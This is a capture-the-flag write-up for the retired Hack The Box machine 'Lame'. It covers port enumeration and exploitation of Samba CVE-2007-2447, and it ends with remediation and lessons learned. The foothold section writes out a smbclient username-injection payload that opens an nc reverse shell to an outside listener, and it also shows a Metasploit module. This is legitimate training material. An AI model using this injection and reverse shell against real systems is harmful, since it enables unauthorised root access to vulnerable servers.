# HTB — Lame

| | |
|---|---|
| **Difficulty** | Easy |
| **OS** | Linux |
| **IP (lab)** | 10.10.10.3 |
| **Status** | Retired ✅ (write-up allowed) |
| **Topics** | Samba `usermap_script` RCE (CVE-2007-2447), service enumeration |

> Study write-up of a **retired** HTB machine, published for educational purposes.
> All commands were run against the isolated HTB lab network.

## Summary

Lame is a classic beginner box. A full port scan reveals an outdated **Samba 3.0.20**
service that is vulnerable to the *username map script* command injection
(**CVE-2007-2447**). Because `smbd` runs as **root**, exploiting it yields a root shell
directly — no privilege escalation step is required.

## Enumeration

Full TCP port scan with service/version detection:

```bash
nmap -sC -sV -p- --min-rate 2000 -oN nmap/initial 10.10.10.3
```

Key findings:

```
21/tcp  open  ftp         vsftpd 2.3.4
22/tcp  open  ssh         OpenSSH 4.7p1
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian
```

Two things stand out:
- **vsftpd 2.3.4** — famously carries a backdoor (CVE-2011-2523), but on this box the
  backdoor path is not reliably reachable.
- **Samba 3.0.20** — vulnerable to CVE-2007-2447. This is the intended path.

Confirm the Samba version:

```bash
smbclient -L //10.10.10.3 -N
# or
nmap --script smb-os-discovery -p445 10.10.10.3
```

## Foothold — CVE-2007-2447 (Samba username map script)

When Samba is configured with `username map script`, the username sent during
authentication is passed to a shell without sanitisation. Injecting shell
metacharacters in the username field executes commands as the smbd user (**root**).

### Manual exploitation (no Metasploit)

Set up a listener:

```bash
nc -lvnp 4444
```

Trigger the injection by embedding a reverse shell in the username via `smbclient`
(the `/=` payload marks the start of the command injection):

```bash
smbclient //10.10.10.3/tmp -U "/=`nohup nc -e /bin/bash 10.10.14.5 4444`" -N
```

The listener receives a shell:

```
$ id
uid=0(root) gid=0(root)
```

Because we are already **root**, both `user.txt` and `root.txt` are readable:

```bash
cat /home/makis/user.txt
cat /root/root.txt
```

### Alternative (Metasploit)

```
use exploit/multi/samba/usermap_script
set RHOSTS 10.10.10.3
set LHOST tun0
run
```

## Privilege Escalation

**Not required.** `smbd` runs as root, so the initial foothold is already a root shell.
This is what makes Lame a good first box — it isolates the "find an outdated service →
match a public CVE → get a shell" loop without a privesc puzzle on top.

## Remediation

- **Patch / upgrade Samba** — CVE-2007-2447 was fixed in Samba 3.0.25. Never expose
  end-of-life Samba to untrusted networks.
- **Do not run services as root** where avoidable; drop privileges.
- **Firewall SMB (139/445)** off the public perimeter; it should rarely be internet-facing.
- Remove unused legacy services (the outdated vsftpd here is dead weight and extra risk).

## Lessons Learned

- Always run a **full** port scan (`-p-`) and *version* detection — the win here is
  entirely in reading `smbd 3.0.20` and mapping it to a known CVE.
- Understand the exploit before firing it: the injection lives in the **username** field,
  which is why a plain `smbclient` one-liner works without any exploit binary.
- Root-owned services turn a single RCE into full compromise — a real-world reminder to
  run services with least privilege.
